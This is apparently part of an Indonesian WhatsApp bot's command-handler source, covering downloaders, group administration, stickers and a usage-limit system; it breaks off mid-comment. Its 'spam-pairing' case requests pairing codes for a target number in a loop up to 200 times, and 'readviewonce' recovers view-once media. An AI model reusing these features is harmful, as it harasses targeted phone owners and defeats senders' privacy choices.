 - Source
 - https://whatsapp.com/channel/0029VaksctN4yltQhVMYdm2g
 -
 - Scrape
 - https://whatsapp.com/channel/0029VaksctN4yltQhVMYdm2g
 -
*/

case 'cc': case 'capcut': {
/*
⚡ Capcut Template Video Downloader
📦 By NDBZ
🔗 Link: https://whatsapp.com/channel/0029VaAMjXT4yltWm1NBJV3J
*/
const axios = require('axios')

function download(url) {
  return new Promise(async(resolve, reject) => {
    try {
      let cc = await axios.get(url, {
        headers: {
          'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
        }
      }).then(x => x.data)
      
      let dataMatch = /<script nonce="argus-csp-token">window\._ROUTER_DATA = (.*?)<\/script>/;
      if (cc.match(dataMatch)) {
        let getJson = JSON.parse(cc.match(dataMatch)[1]).loaderData['template-detail_$'].templateDetail
        if (getJson.templateId) {
          resolve({ status: true, mess: `Berhasil mengambil data`, data: getJson })
        } else {
          resolve({ status: false, mess: `Tidak ada metadata tersedia`})
        }
      }
    } catch(e) {
      reject({ status: false, mess: `Gagal mengambil metadata`})
    }
  })
}

if (!text.includes('www.capcut.net')) return m.reply('masukan link cc!!')
let hasil = await download(text)

try {

let deku = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴄᴄ ]* ── .々─ᯤ\n`
deku += `│    =〆 ᴛɪᴛʟᴇ: ${hasil.data.title}\n`
deku += `│    =〆 ᴅᴇsᴄ: ${hasil.data.desc}\n`
deku += `│    =〆 ɪᴅ: ${hasil.data.templateId}\n`
deku += `│    =〆 ᴜʀʟ: ${hasil.data.structuredData.url}\n`
deku += `⏤͟͟͞͞╳────────── .✦`

await kyami.sendMessage(m.chat, { video: { url: hasil.data.videoUrl }, caption: deku }, { quoted: m })

} catch (e) {
 m.reply('error kak...')
}

}
break

case 'open': 
case 'buka': {
	if (!users.registered) return reply(mess.daftar)
if (!m.isGroup) return reply(mess.ingroup)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
kyami.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`Sukses membuka grup`)
}
break

case 'close': 
case 'tutup': {
	if (!users.registered) return reply(mess.daftar)
if (!m.isGroup) return reply(mess.ingroup)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
kyami.groupSettingUpdate(m.chat, 'announcement')
m.reply(`Sukses menutup grup`)
}
break
case 'promote': {
	if (!users.registered) return reply(mess.daftar)
if (!m.isGroup) return reply(mess.ingroup)
if (!Creator && !isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kyami.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break

case 'demote': {
	if (!users.registered) return reply(mess.daftar)
if (!m.isGroup) return reply(mess.ingroup)
if (!Creator && !isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kyami.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break
case 'quotesbacot': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
 reply(bacotan)
}
break
case 'quotesanime': {
	if (!users.registered) return reply(mess.daftar)
	if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  uselimit(1)
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  return reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
case 'clearall': {
if (!Creator) return reply(mess.owner)
kyami.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
reaction(m.chat, "✅")
}
break
    case 'totalfitur': {
 return reply(`${totalFitur()}`)
}
break
    case 'claim': case 'daily': {
  if (!users.registered) return reply(mess.daftar)
 let __timers = (new Date - users.lastclaim)
   let _timers = (86400000 - __timers)
   let timers = clockString(_timers)
   if (new Date - users.lastclaim > 86400000) {
   	kyami.sendMessage(m.chat, { text: `*Daily Claim*\n_Successful Claim_\n- limit : 3\n\n_Claim Reset_` }, { quoted: m })
   	users.limit[m.sender].limit += 3
   	users.lastclaim[m.sender].lastclaim = new Date * 1
   } else {
   	kyami.sendMessage(m.chat, { text: `Please wait *⏱️${timers}* again to be able to claim again` }, { quoted: m })
   }
    }
break
case 'script': case 'sc': {
replymenu(`SCRIPT INI FREE DARI YOUTUBE : https://www.youtube.com/@FaaaMods`)
}
//KALO LU GAHAPUS RESPECT SIH  :)
break
case 'remini': case 'hd': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!quoted) return reply(`Where is the picture?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
reply(mess.wait)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
let leo = {
  image: proses,
  caption: `done by: ${namabot}`,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idsaluran,
 newsletterName: `Hd By: ${ownername}`, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kyami.decodeJid(kyami.user.id) },
},
}
await kyami.sendMessage(m.chat, leo, { quoted: qpayment });
}
uselimit(1)
break
case 'tqto': {
return reply(`📍 *THANKS TO* 📍\n\n
- ALLAH SWT
- 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜ ( Hmmmm )
- KYAMI SILENCE ( PENGEMBANG )
- KYUURZY ( BASE )
- RISSXD
- PENYEDIA FITUR
- PENYEDIA API`)
}
break
case 'ping': {
if (!users.registered) return reply(mess.daftar)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
            }
            break
case "redeemcode": {
if (!users.registered) return reply(mess.daftar)
if (!args[0]) return reply("Codenya")
if (args[0] !== args[0].toLowerCase()) return reply("*Code Redeem* wajib huruf kecil semua!")
if (db.data.settings.hadiahkadaluwarsa.includes(args[0])) return reply("*Code* tersebut sudah digunakan!")
if (!db.data.settings.hadiah.includes(args[0])) return reply("*Code* tidak valid!")
db.data.settings.hadiahkadaluwarsa.push(args[0])
var code = db.data.settings.hadiah.indexOf(args[0])
db.data.settings.hadiah.splice(code, 1)
db.data.users[m.sender].limit += 15
var teks = `Selamat kepada @${m.sender.split("@")[0]} 🎉

kamu mendapatkan *15 Limit* dari *Code Redeem "${args[0]}"*`
await reply(`Berhasil Mendapatkan *15 Limit* dari *Code Redeem ${args[0]}*`).then(() => {
kyami.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdReply: { thumbnailUrl: thumbnail, title: "© Message System Notifikasi", body: null, sourceUrl: 'https://youtube.com/@Slnckyami', renderLargerThumbnail: true, mediaType: 1}}}, {quoted: qpayment})
})}
break
case 'daftar': { 
  if (users.registered === true) return reply(`*❕ You are already registered*`)
  if (!text) return reply(`contoh : .daftar nama.umur`)
  let t = text.split('.')
  let name = t[0]
  let age = t[1]
  if (!name) return reply(`nama tidak boleh kosong`)
  if (!age) return reply(`umur tidak boleh kosong`)
  if (isNaN(age)) return reply(`umur tidak valid`)
  age = parseInt(age);
  if (age > 50) return m.reply('Maximum Age *50* years')
  if (age < 5) return m.reply('Minimum Age *5* years')
  if (name.split('').length > 100) return m.reply('Nama Maksimal 100 Karakter Ajg')
  let sn = generateRandomPassword(10)
  users.nick = name.trim()
  users.age = age
  users.registered = true
  users.limit += 30
  users.sn = sn
  users.regTime = +new Date
    
 reply(`
┏─• *USER 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
│◉ *sᴛᴀᴛᴜs:* ☑️ sᴜᴄᴄᴇssғᴜʟ
│◉ *ɴᴀᴍᴇ:* ${name}
│◉ *ᴀɢᴇ:* ${age} ʏᴇᴀʀs
┗───•
 ◉ *SN:* ${sn}
 ◉ *LIMIT:* + 30 BONUS AWAL
`)
}
break
case 'ceksn': {
if (!users.registered) return reply(mess.daftar)
await uselimit(1)
return reply(`${users.sn}`)
}
break
case 'unregister': {
  if (!args[0]) return reply(`*• Example:* ${prefix + command} *[Serial number]*`)
  let user = global.db.data.users[m.sender]
  if (args[0] !== users.sn) return reply('*[ x ] Invalid serial number*')
   let __waktuh = (new Date - global.db.data.users[m.sender].regTime)
   let _waktuh = (+ 86400000 - __waktuh)
   let waktuh = clockString(_waktuh)
  /* if (new Date - global.db.data.users[m.sender].unreglast > + 86400000) {*/
   user.regTime = new Date * 1
  user.registered = false
  user.age = 0
  user.limit = 0
  m.reply(`[ ✓ ] Unregister successful!`)
 /* } else m.reply(`[ x ] You have *${prefix + command}*.\nPlease wait *${time}* to get *${prefix + command}* back.`)*/
}
break        
case 'ceklimit': {
if (!users.registered) return reply(mess.daftar)
let a = db.data.users[m.sender]
reply(`*YOUR LIMIT IS IN AMOUNT ${a.limit} LIMIT*`)
}
break
case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
}

            break
case 'request': case 'reportbug': {
    if (!users.registered) return reply(mess.daftar)
	if (!text) return reply(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${m.pushName},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
               kyami.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            kyami.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
break        
case "joingc": case "join": {
if (!Creator) return reply(mess.owner)
if (!text && !m.quoted) return reply(`*Example:* ${prefix + command} Url Link Group`)
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return reply("Invalid Link!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await kyami.groupAcceptInvite(result).then(respon => reply("* Successfully Entered Into Group Chat")).catch(error => reply(error.toString()))
}
break  
case 'customsn': {
if (!Creator) return reply(`khusus Kyami Anjir`)
if (!text) return reply(`example : .customsn +6281**|Kyami`)
let t = text.split('|')
let nomor = t[0]
let serial = t[1]
let oo = `${nomor}@s.whatsapp.net`
global.db.data.users[oo].sn = serial
return reply(`berhasil diubah menjadi ${serial}`)
}
break
case 'restart':
if (!Creator) return reply(mess.owner)
await m.reply('Restart...')
process.exit()
break
case 'obfus': case 'enc': case 'obfuscate':{
if (!text) return reply(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(text)
reply(`Success
${meg.result}`)
}
break        
case 'database': {
if (!Creator) return reply(mess.owner)
totalregg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    reply(`*${totalregg} users using Bot*`)
}
break 
case "listhadiah": {
if (!Creator) return reply(mess.owner)
if (db.data.settings.hadiah.length < 1) return reply("Tidak ada code hadiah")
var teks = `*乂 LIST CODE HADIAH*\n\nTotal : *${db.data.settings.hadiah.length}*\n\nKetik .redeemcode <kode> Untuk Redeem Code`
db.data.settings.hadiah.forEach((e) => {
teks += ` ◦ ${e}\n`
})
reply(teks)
}
break
case "buathadiah": {
if (!Creator) return reply(mess.owner)
if (isNaN(args[0])) return reply('Jumlah Kode Hadiah')
for (let i = 0; i < Number(args[0]); i++) {
db.data.settings.hadiah.push(crypto.randomBytes(4).toString("hex"))
}
let teks = '\n'
db.data.settings.hadiah.forEach((e) => {
teks += `◦ ${e}\n`
})
reply(teks)
}
break
case 'clearsession': {
                if (!Creator) return reply(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    reply(teks)
                    await sleep(2000)
                    reply("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("Successfully deleted all the trash in the session folder")
                });
            }
            break
case 'bcgc': case 'bcgroup': {
if (!Creator) return reply(mess.owner)
if (!text) return reply(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
let getGroups = await kyami.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
kyami.sendMessage(i, {text: `${text}`}, {quoted: kyamidsaluran})
}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case "backup":{
if (!Creator) return reply(mess.owner);
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await kyami.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break        
case 'public': {
if (!Creator) return reply(`khusus Kyami saja`)
kyami.public = true
reply('*Berhasil Mengubah Ke Penggunaan Publik*')
            }
            break
            case 'self': {
if (!Creator) return reply(`khusus Kyami saja`)
kyami.public = false
reply('*Sukses Berubah Menjadi Pemakaian Sendiri*')
            }
            break
case 'spam-pairing': {
if (!Creator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
reply(mess.wait)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
case 'addlimit': {
                if (!Creator) return reply(`khusus Kyami loh cik`)
                if (!text) return reply(`Usage ${prefix + command} number|limit amount`)
                let usernya = text.split('|')[0]
                let limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                global.db.data.users[oo].limit += parseInt(limitnya)
                reply(`done`)
}
break        
case 'rvo':
case 'readviewonce': {
	if (!users.registered) return reply(mess.daftar)
	if (users.limit < 10) return reply(`[ ! ] LIMITMU KURANG DARI 10`)
    uselimit(10)
	if (!m.quoted) return reply(`Balas untuk melihat pesan sekali`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return reply(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return kyami.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return kyami.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break        
case 'smeme': {
    if (!users.registered) return reply(mess.daftar)
    let [atas, bawah] = text.split`|`
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || ''
    if (!mime) return reply(`balas gambar dengan perintah\n\n${prefix + command} <${atas ? atas : 'teks atas'}>|<${bawah ? bawah : 'teks bawah'}>`)
    reply(global.mess.wait)
    if (!/image\/(jpe?g|png)/.test(mime)) return reply(`_*Mime ${mime} tidak didukung!*_`)
    let img = await q.download()
    let url = await uploadImage(img)
    let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas ? atas : '')}/${encodeURIComponent(bawah ? bawah : '')}.png?background=${url}`
    kyami.sendImageAsSticker(m.chat, meme, qsticker, { packname: packname, author: author })

}
break 
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!users.registered) return reply(mess.daftar)
 if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
reply(`Sedang Proses Permintaan...`)
let media = await quoted.download()
let encmedia = await kyami.sendImageAsSticker(from, media, qsticker, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kyami.sendVideoAsSticker(from, media, qsticker, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break   
case 'getidch': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!m.quoted) return m.reply('reply saluran channel nya lah')
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo
await m.reply(`Name: ${id.newsletterName}\nId: ${id.newsletterJid}`)
} catch (e) {
m.reply('Harus chat dari channel bang')
}
}
uselimit(1)
break        
case 'tourl': {
 if (!users.registered) return reply(mess.daftar)
 if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
  uselimit(1)
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime) return reply('Tidak ada media yang ditemukan')
  let media = await q.download()
  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
  let fileSizeLimit = 5 * 1024 * 1024 
  if (media.length > fileSizeLimit) {
    return reply(`Ukuran media tidak boleh melebihi 5MB`)
  }
  let link = await (isTele ? uploadImage : uploadFile)(media)
  replyy(`▧ INI LOH CIK😋

│ • ${link}

${media.length} Byte(s)
${isTele ? '(Tidak Ada Tanggal Kedaluwarsa)' : '(Expired 24 hours)'}`)
}

			break
case 'yts': case 'ytsearch': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1 ) return reply(`[ ! ] LIMITMU KURANG DARI 1`)
if (!text) return reply(`Example : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
}
kyami.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: qpayment })
            }
  uselimit(1)
            break
/*
 - Fitur Play Scrape Daffa
 - Source
 - https://whatsapp.com/channel/0029VadFS3r89inc7Jjus03W
 -
 - Scrape
 - https://whatsapp.com/channel/0029VaiVeWA8vd1HMUcb6k2S/284
 -
*/

case 'play': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1 ) return reply(`[ ! ] LIMITMU KURANG DARI 1`)
const axios = require('axios');

const SaveTube = {
    qualities: {
        audio: { 1: '32', 2: '64', 3: '128', 4: '192' },
        video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
    },
    
    headers: {
        'accept': '*/*',
        'referer': 'https://ytshorts.savetube.me/',
        'origin': 'https://ytshorts.savetube.me/',
        'user-agent': 'Postify/1.0.0',
        'Content-Type': 'application/json'
    },
    
    cdn() {
        return Math.floor(Math.random() * 11) + 51;
    },
    
    checkQuality(type, qualityIndex) {
        if (!(qualityIndex in this.qualities[type])) {
            throw new Error(`❌ Kualitas ${type} tidak valid. Pilih salah satu: ${Object.keys(this.qualities[type]).join(', ')}`);
        }
    },
    
    async fetchData(url, cdn, body = {}) {
        const headers = {
            ...this.headers,
            'authority': `cdn${cdn}.savetube.su`
        };

        try {
            const response = await axios.post(url, body, { headers });
            return response.data;
        } catch (error) {
            console.error(error);
            throw error;
        }
    },
    
    dLink(cdnUrl, type, quality, videoKey) {
        return `https://${cdnUrl}/download`;
    },
    
    async dl(link, qualityIndex, type) {
        const quality = SaveTube.qualities[type][qualityIndex];
        if (!type) throw new Error('❌ Tipe tidak valid. Pilih 1 untuk audio atau 2 untuk video.');
        SaveTube.checkQuality(type, qualityIndex);
        const cdnNumber = SaveTube.cdn();
        const cdnUrl = `cdn${cdnNumber}.savetube.su`;
        
        const videoInfo = await SaveTube.fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
        const badi = {
            downloadType: type,
            quality: quality,
            key: videoInfo.data.key
        };

        const dlRes = await SaveTube.fetchData(SaveTube.dLink(cdnUrl, type, quality, videoInfo.data.key), cdnNumber, badi);

        return {
            link: dlRes.data.downloadUrl,
            duration: videoInfo.data.duration,
            durationLabel: videoInfo.data.durationLabel,
            fromCache: videoInfo.data.fromCache,
            id: videoInfo.data.id,
            key: videoInfo.data.key,
            thumbnail: videoInfo.data.thumbnail,
            thumbnail_formats: videoInfo.data.thumbnail_formats,
            title: videoInfo.data.title,
            titleSlug: videoInfo.data.titleSlug,
            videoUrl: videoInfo.data.url,
            quality,
            type
        };
    }
};

if (!text) return m.reply('nama lagu pengen di search!')
const { search } = require('yt-search')
const get = await search(text)
const result = get.all[0]

if (result === 0) {
 m.reply('maaf ga ketemu...')
}

let deku = `⏤͟͟͞͞╳── *[ ᴘʟᴀʏ - ʏᴏᴜᴛᴜʙᴇ ]* ── .々─ᯤ\n`
deku += `│    =〆 ᴛɪᴛʟᴇ: ${result.title}\n`
deku += `│    =〆 ɪᴅ: ${result.videoId}\n`
deku += `│    =〆 ᴅᴜʀᴀsɪ: ${result.timestamp}\n`
deku += `│    =〆 ᴅᴇsᴄʀɪᴘᴛɪᴏɴ: ${result.description}\n`
deku += `│    =〆 ᴜʀʟ: ${result.url}\n`
deku += `⏤͟͟͞͞╳────────── .✦`

const a = await kyami.sendMessage(m.chat, {
  text: deku,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: result.title,
      mediaType: 1,
      previewType: 1,
      body: `views: ${result.views} / durasi: ${result.timestamp}`,
      //previewType: "PHOTO",
      thumbnailUrl: result.thumbnail,
      renderLargerThumbnail: true,
      mediaUrl: result.url,
      sourceUrl: result.url
    }
  }
}, { quoted: m })

try {
const Deku = await SaveTube.dl(result.url,"3","audio")

await kyami.sendMessage(from, { audio: { url: Deku.link }, mimetype: 'audio/mpeg' }, { quoted: a })

} catch (eror) {
  m.reply('maaf kak error....')
}

}
uselimit(1)
break
/*
 - Case Break Ytmp3 and Ytmp4
 - Source
 - https://whatsapp.com/channel/0029VadFS3r89inc7Jjus03W
 -
 - Scrape
 - https://whatsapp.com/channel/0029VaAMjXT4yltWm1NBJV3J
 -
*/
/**
*[ CASE BREAK YTMP4 ]*
**/
case 'ytmp3': case 'ytaudio': case 'yta': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1 ) return reply(`[ ! ] LIMITMU KURANG DARI 1`)
const axios = require('axios')
const yts = require('yt-search')

/**
 * Fungsi untuk mengunduh video atau audio dari YouTube
 * 
 * By NDBOTZ ⟩⟩ https://whatsapp.com/channel/0029VaAMjXT4yltWm1NBJV3J
 * 
 * @param {string} url - URL video YouTube yang akan diunduh
 * @param {string} [format='mp3'] - Format file yang diinginkan (mp3 atau mp4)
 * @returns {Promise<DownloadResult>} Promise dengan hasil download
 * 
 * @example
 * // Download audio MP3
 * ytdl('https://youtube.com/watch?v=videoID')
 *   .then(result => {
 *     if (result.status) {
 *       console.log('Judul:', result.title);
 *       console.log('Link Download:', result.dl);
 *     }
 *   });
 * 
 * @example
 * // Download video MP4
 * ytdl('https://youtube.com/watch?v=videoID', 'mp4')
 *   .then(result => {
 *     if (result.status) {
 *       console.log('Judul:', result.title);
